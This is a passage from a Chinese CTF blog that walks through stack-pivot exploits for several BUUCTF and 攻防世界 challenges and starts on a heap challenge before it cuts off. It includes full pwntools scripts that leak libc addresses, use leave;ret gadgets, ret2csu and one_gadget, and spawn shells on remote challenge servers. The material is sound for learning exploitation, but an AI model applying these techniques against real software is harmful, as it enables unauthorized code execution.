class="string">&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(level_ret_addr)<span class="comment">#这个ljust的意思是说不足0x28的部分补成00（也就是我在上图中标注的垃圾数据）这个0x38的偏移算法和上面那个0x28是相同的，这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="攻防世界上的greeting-150"><a href="#攻防世界上的greeting-150" class="headerlink" title="攻防世界上的greeting-150"></a>攻防世界上的greeting-150</h2><p><img src="/../img/2706180-20220118121000718-655614088.jpg"></p>
<p>这里表面上是看开了canary，但是在主要的函数中，没有发现canary的影子，因此，这个canary保护，在这里是有点迷惑性的，我们可以去溢出。</p>
<p><img src="/../img/image-20221007101237565.png" alt="image-20221007101237565"></p>
<p> 在上图中标注了，base64decode，是将解码后的内容放在了v4里面，而不是v6里面，v6里放的是解码后的字符串长度。</p>
<p> 我之前看师傅们的wp一直纳闷，这输入的内容也没有被编码过，咋就到这里可直接就解码了，最后看到了exp才明白，原来是我们发送payload时候，我们自己去编码…，配合这个信息，我也就明白了，原来v6&gt;0xc的这个限制，是说我们payload只能发送12个字节。</p>
<p>执行了这句之后，我们的input里面放的也是解码之后的内容了（因为我们是要把payload编码之后发送，因此这里的input实际上就是我们的payload)<br><font color=red><br>现在input里面就是payload，这个payload只能发送12个字节</p>
</font>


<p>ok，我们继续去看auth这个函数。</p>
<p><img src="/../img/image-20221007101316583.png" alt="image-20221007101316583"></p>
<p>  找到了溢出点，在这里。[ebp-8h]的意思是说，这个v4距离ebp有八个字节的距离，可是input里面可以装12个字节，现在memcpy就可以把input的内容复制给了v4（这个v4和main函数里的v4不是一码事） 只能装8个字节，但是复制了12个字节过去，有什么好说的，溢出就完事了。但是只能溢出覆盖ebp，<font color=red><strong>之前栈迁移的时候，我们为了凑齐两次leave;ret都是将main函数的返回地址写成leave,ret的地址，但是这道题我们没法写到返回地址上，怎么办，我们没办法凑够两次leave;ret了么，不不不，别忘了我们现在可不在main函数还是在auth函数里面，当auth函数结束的时候也会执行一次leave;ret再加上main函数结束的一次leave;ret，因此我们也凑够了两次leave;ret。</strong></font></p>
<p>我们需要换到哪个地方去执行后门函数呢？没错，就是刚才说的input</p>
<p><img src="/../img/image-20221007101341015.png" alt="image-20221007101341015"></p>
<p>这里也可以看到input是处于bss段的。</p>
<p> 现在我们来看这道题，我们可以往input里面输入12个字节，那假设我输入的是aaaabbbbcccc，<font color=red>（并且这个cccc是aaaabbbbcccc这个字符串的首地址）。</font></p>
<p>那么现在栈里就是这么个情况<br><img src="../img/image-20221007101352060.png" alt="image-20221007101352060" style="zoom:50%;" /></p>
<p>当执行到leave的时候，mov esp ebp，此时的esp是cccc了，然后ebp原本该回到正常的main函数的栈底，可是现在它来到了cccc的这个地址（因为执行了auth函数中的leave ret，这里才是核心点）（并且要注意的是ebp内容和ebp是两个东西，ebp的内容装什么都可以，但是ebp本身只能去指向地址）（即此时是ebp指向了aaaa的地址，上面说了cccc的地址是指向的aaaa所处位置）。</p>
<p>现在程序继续运行，因为函数的返回地址是正常的，所以它还是回到了main函数里，它又开始往下运行，直到main函数结束了，它开始执行leave，那么此时我们又一次mov esp ebp；esp成了aaaa的地址，这个时候又进行了pop ebp，那么esp成了bbbb，最后到ret的时候，pop eip，此时就会把栈顶的bbbb，弹入eip去执行了。</p>
<p>如果感觉我说的太抽象了，没有图片的话，可以参考这个师傅的文章<a href="https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request_id%22:%22164229926316780265467309%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164229926316780265467309&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&utm_term=format2&spm=1018.2226.3001.4187">(24条消息) format2(xctf)_whiteh4nd的博客-CSDN博客</a>，他这里面最后画的三张图片，描述的很清楚，我上面的叙述过程，跟他图片表达的是一个意思。</p>
<p>最后，我们拐过来看一下，eip执行了bbbb，那我们把bbbb换成后门函数的地址不就ok了，然后是cccc的这个地址，不就是我们这道题的input地址么，input本身能装12个字节，把它本身的地址写到cccc，就是12个字节的最后4字节，这样不就把栈迁移到input的内容里了么（但事实上栈没有过去，毕竟这里可是bss段）</p>
<p>Exp编写很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59650</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08049284</span></span><br><span class="line"></span><br><span class="line">input_addr=<span class="number">0x0811EB40</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(input_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>至此本题也就结束了。</p>
<p>但通过这道题，我学到了不少的东西。</p>
<p>尤其是这个函数</p>
<img src="../img/2706180-20220118123108947-994146250.jpg" alt="EJnn.jpg" border="0">

<p>这里我一直是在想怎么把input写成这个-559038737，而忘记了其实不必循规蹈矩，因为没开pie，我们完全可以把这个system函数的地址去弄到eip里面使其执行。也认识到了找漏洞点的重要性，上来就去仔细分析函数的功能用处不大，大致扫过即可，先去找明显的漏洞点，在围绕这个漏洞点想一下，我们能利用它做些什么。</p>
<hr>
<hr>
<h2 id="BUUCTF上的-Black-Watch-入群题"><a href="#BUUCTF上的-Black-Watch-入群题" class="headerlink" title="BUUCTF上的[Black Watch 入群题]"></a>BUUCTF上的[Black Watch 入群题]</h2><img src="../img/2706180-20220118123108942-1379753087.jpg" alt="E2mG.jpg" border="0">



<pre><code>打开IDA发现，主程序中，buf距离栈底有0x18个字节，但是最后的一个read却可以读入0x20个字节，很明显这里存在溢出，但是吧，这个溢出的长度也是很尴尬的，我们确实可以填入system函数地址，但是这样就没办法传参数了，而且我们发现程序里也没有system函数，因此肯定还是要泄露函数地址，用libc里面的system获取shell。

我们发现这里的溢出刚好可以覆盖ebp和返回地址，很明显这里要用栈迁移。然后我们再看下第一个read把输入的内容储存到哪了
</code></pre>
 <img src="../img/2706180-20220118123108938-1447621027.jpg" alt="EfG9.jpg" border="0">



<p>发现是存到了bss段。</p>
<p>那我们的思路大概就出来的，首先把在第一次输入中read去把write_plt的地址和它的参数存进去，因为我们想要system函数地址肯定是需要先泄露libc基地址的。然后第二次输入去把ebp给改成bss段的地址，然后把返回地址改成leave,ret地址（具体原因参考栈迁移原理）</p>
<p>然后程序从main函数返回的时候，被劫持到了bss段，去执行了write函数，泄露出来write函数的got地址，<strong>并且把它的返回地址填写成main函数</strong>，因为我们需要再让程序跑一次，毕竟我们最终可是要去执行system函数的，现在只是把libc基地址给泄露出来了而已。</p>
<p>现在执行完了write函数，然后返回到main函数重新获得了两次输入的机会，那么我们依然如法炮制，在第一次输入中存入system函数地址和它的参数，此时各单位以就位，就差了修改ebp了，然后来到了第二次输入，我们先填充垃圾数据，直到填充至ebp，然后把ebp的地址写成bss段的地址，还要把返回地址写成leave;ret的地址。</p>
<p>最后main函数返回的时候就进行了栈迁移，来到了我们步骤的bss段，然后执行system函数，成功GetShell。</p>
<p>以上只是介绍了本题的思路，但是没有探究原理，具体原理参考前面的栈迁移原理部分。</p>
<p>本题的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27917</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048513</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>) <span class="comment">#前面的是bss段地址，后面这个地址是level;ret地址</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里有一个很重要的点，一定要注意，就是这里第二次输入的时候，必须要用send去发送，不能用sendline发送</p>
<p>下图的左侧是使用send发送了0x20个数据，右侧使用的是sendline发送了0x20个数据，可以发现，<em>右侧最后发送是多了一个回车</em>，此时程序本来是正常要发送一句hello good ctfer!what is you name?然后会等待用户发送一个内容，然后显示what you want to，左侧的确是这样，但右侧直接what is you name?之后把what you want to给打印出来了，也就根本没有让用户输入内容，为什么？<strong>因为sendline多出来的回车，存放到了缓冲区里面，下次输入的时候，程序直接就把缓冲区里的内容读进去了，发现是个回车，程序认为你的输入已经结束了，因此就打印了what you want to，事实上你根本就还没输入。</strong></p>
<p>由此可见，在任何时候发送数据，选择sendline时，都需谨慎。<br><img src="../img/2706180-20220118123108958-93341427.jpg" alt="EkPq.jpg" border="0"></p>
<h2 id="BUUCTF上的gyctf-2020-borrowstack"><a href="#BUUCTF上的gyctf-2020-borrowstack" class="headerlink" title="BUUCTF上的gyctf_2020_borrowstack"></a>BUUCTF上的gyctf_2020_borrowstack</h2><p>这道题，不知道什么原因，用远程的exp是打不通本地的。因此这里我远程和本地的wp分别写了一份。二者的前面是一模一样的（但是后面的思路是不一样的），如果看过其中一份，那么另一份前面的内容跳过即可。<br>###打远程的WP</p>
<p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p>
<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
<p><img src="/../img/2706180-20220206163137949-2023688181.png"></p>
<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
<p><img src="/../img/2706180-20220206163202729-1115577905.png"></p>
<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和&#x2F;bin&#x2F;sh参数。</p>
<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</p>
<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
<p><img src="/../img/2706180-20220206163247051-126352913.png"></p>
<p><img src="/../img/2706180-20220206163309124-364277226.png"></p>
<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容（不仅仅是got表，还有FILE *stdout和FILE *stdin），导致程序崩溃。这里光说的话，比较抽象，我在这里详细讲一下。</p>
<p>因为这里的地址0x601060存放的是stdout指针，然后等到返回main函数之后又会执行setbuf(stdout, 0LL);可是因为这个0x601060距离我们迁移到的bss段这里太近了（我们迁移到的地址是0x601080），当执行put函数的时候执行了一次sub rsp 0x18,并且还执行了多次的push，此时的0x601060已经被覆盖成别的内容了具体情况参考下面的图【1】和图【2】<br><img src="/../img/2706180-20220206163334765-1162997865.png"></p>
<p><img src="/../img/2706180-20220206163343356-1256253278.png"></p>
<p>​												               图【1】</p>
<p><img src="/../img/2706180-20220206163355949-1171818220.png"></p>
<p>​																	图【2】</p>
<p>可以看见这两张图片，都因为调用了puts函数，从而影响了栈的变化，修改了stdout指针。等到返回main函数的时候，执行了setbuf(stdout, 0LL)，从而导致程序崩溃。</p>
<p>因此在这里我们的思路是利用ret指令，把构造的payload的存入稍微高点的地址空间，这样即使执行了puts函数开辟了栈帧，也依旧没有干扰到0x601060所存放的stdout指针。</p>
<p>继续说这个思路遇见的问题，因为要利用ret指令往下迁移来进行“栈”的布局，但是用多少个ret往下滑，这个只能去一次一次试。发现至少填充20个ret就可以把”栈”迁移到一个不会影响程序运行的地方。也就是说我们只要第二次先输入20个ret，然后正常的写一个pop_rdi的指令，然后是puts的got地址，接着就填写puts的plt地址，最后把返回地址填写成main函数。这样就泄露出来了libc_base，然后找到libc版本（打本地和远程找libc版本是方法是不一样的）我这里说下远程的libc版本怎么找，看网上师傅们说是泄露函数地址的后三位，然后上网站上搜索libc版本，可是我试了下不行（不知道是哪出了问题），然后有位师傅告诉我他是这么找的。</p>
<p><img src="/../img/2706180-20220206163407809-1014058819.png"></p>
<p>发现这是ubuntu16，然后去BUUCTF上找资源（因为我这个是在BUUCTF上做的），发现资源如下</p>
<p><img src="/../img/2706180-20220206163434246-1049956071.png"></p>
<p>然后点一下这个64bit的这个libc，下载即可。</p>
<p>最后用one_gadget来搜索这个libc的库，去找到获取shell的语句地址。</p>
<p><img src="/../img/2706180-20220206163445744-69836766.png"></p>
<p>这个constraints下面的就是这个execve执行的条件(至于哪个地址能满足这个条件，一个一个试试就行），然后上面就是对应的地址，最后我们要用这个地址去加上libc_base，得到真正的one_gadget地址。接着返回到main函数再来一遍，这回第一次输入的时候，我们直接把这个one_gadget给放入返回地址即可。最后要注意的就是因为返回到main函数之后，是有两个read的，尽管我们在第一个read就覆盖了返回地址，但是还是要把第二个read给发送一个内容，才可以结束main函数，因此我在最后一个read发送了一个’1’。</p>
<p>这个思路其实还有一种变形，就是在第一次read的时候，把rbp直接填充成我们要迁移之后的地址（这个地址是要保证执行puts函数也不会干扰到程序的正常数据），然后第二次输入只需要把迁移后的地址之前全部填充成垃圾数据，然后构造payload，等到迁移之后，直接迁移到了构造的payload的这里，效果和变形之前的思路是一样的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25199</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_ret_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_addr=<span class="number">0x4004c9</span></span><br><span class="line">main_addr=<span class="number">0x400626</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=p64(ret_addr)*<span class="number">20</span> <span class="comment">#这里ret最少是20个，也可以多一点</span></span><br><span class="line">payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shell))</span><br><span class="line">payload3=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>###打本地的wp</p>
<p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p>
<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
<p><img src="/../img/2706180-20220206163137949-2023688181.png"></p>
<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
<p><img src="/../img/2706180-20220206163202729-1115577905.png"></p>
<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和&#x2F;bin&#x2F;sh参数。</p>
<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。<strong>因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</strong></p>
<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
<p><img src="/../img/2706180-20220206163247051-126352913.png"></p>
<p><img src="/../img/2706180-20220206163309124-364277226.png"></p>
<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容，导致程序崩溃。</p>
<p>因此在这里我们不去返回到main函数，直接返回到read函数，这样就不会执行setbuf。</p>
<p>首先的第一个问题就是栈迁移之后，去执行puts函数，puts函数开辟的栈帧会去影响前面的got表中的内容，因此修改rbp时，我们把迁移的地址写的高一点，这样跳转执行的时候，就不会干扰低地址的数据。</p>
<p>由于这是64位程序，我们要想执行read，需要去找gadget进行传参。可是搜索之后才发现我们没有能控制rdx和rsi的指令，这也就是说我们如果想找gadget的话，执行read函数，连输入的地址都控制不了，因此这里采用ret2csu。</p>
<p><img src="/../img/2706180-20220206164556714-917859079.png"></p>
<p> （关于这个ret2csu的细节，在另一篇博客上说明，这里只介绍大致思路），然后执行了read函数之后，直接把read返回地址填写one_gadget地址即可获取shell。在执行read之前先执行puts去泄露puts的got地址，然后把puts的返回地址进行ret2csu去执行read函数。执行完puts的时候要记得给接收了，然后我们要去拿到libc基址，只需要用puts的真实地址去减libc库中的puts地址即可。用ldd去看下程序所依赖的动态库。</p>
<p><img src="/../img/2706180-20220206164604873-25607843.png"></p>
<p>获取了动态库的版本之后，就可以得到libc基址，然后再用one_gadget去搜索可以获取shell的one_gadget。</p>
<p> <img src="/../img/2706180-20220206164614769-1489437904.png"></p>
<p>至于哪个能用，一个一个试一下就行了。最后用one_gadget加上libc基址就是能够获取shell的地址，我们把这个指令的地址放到read的返回地址即可获取shell。至于怎么知道read的返回地址，这里有点讲究。</p>
<p>因为我们这里直接call read的got地址了，因此执行call的时候，会把下一条指令去当做返回地址，也就是0x4006ed<br><img src="/../img/2706180-20220206164714236-513385521.png"><br>（用ida也可以看出来） 又因为返回地址一定会被存到栈里面（这时候在执行read函数之前 用gdb看一下栈 看看哪个地址里面指向的是0x4006ed)</p>
<p> 然后就去将read函数输入内容的地址 设置成那个栈的地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h1 id="6、附录"><a href="#6、附录" class="headerlink" title="6、附录"></a>6、附录</h1><p>找leave;ret指令地址，只要在IDA里的代码段随便找到有leave ret出现的地方，取leave的地址即可</p>
<p> <img src="/../img/2706180-20220118122656393-1019618142.png"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF刷题记录</title>
    <url>/posts/a90346a2.html</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>现在BUU第六页快做完了，发现现在有的题目在做的时候确实没想出来，不过看了一眼其他师傅的wp就很快写出来了,如果针对这类题目再去单独写一份wp又没太多必要。所以在之后的做完的题目里，没有必要单独写一篇wp的题目以及直接做出来的题目就都放到这篇文章来简单记录一下了。</p>
<span id="more"></span>

<h2 id="hwb-2019-mergeheap"><a href="#hwb-2019-mergeheap" class="headerlink" title="hwb_2019_mergeheap"></a>hwb_2019_mergeheap</h2><p>merge函数可以让两个堆块的内容合并一起，并且新申请出来一个大堆块。让内容合并在一起的思路是先复制第一个堆块的数据，然后再把第二个堆块的数据追加到第一个堆块的后面。<strong>漏洞是追加的时候如果我们申请了例如0x88 0x98 0xa8这样的堆块并且写满了数据，那么还会把第二个堆块的size位给追加上去，从而溢出覆盖了下一个堆块size位</strong></p>
<p>做一个堆块重叠打tcache poisoning即可。泄露libc地址的话，先申请两个堆块(保证加起来的size大于0x410)，然后合并后将大堆块释放掉，再申请0x8的堆块出来，写入0x8个字符a，对其执行show函数，即可泄露unsorted bin的bk指针</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28548&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">idx1,idx2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx1:&quot;</span>,<span class="built_in">str</span>(idx1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx2:&quot;</span>,<span class="built_in">str</span>(idx2))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">merge(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec110</span></span><br><span class="line">log_addr(<span 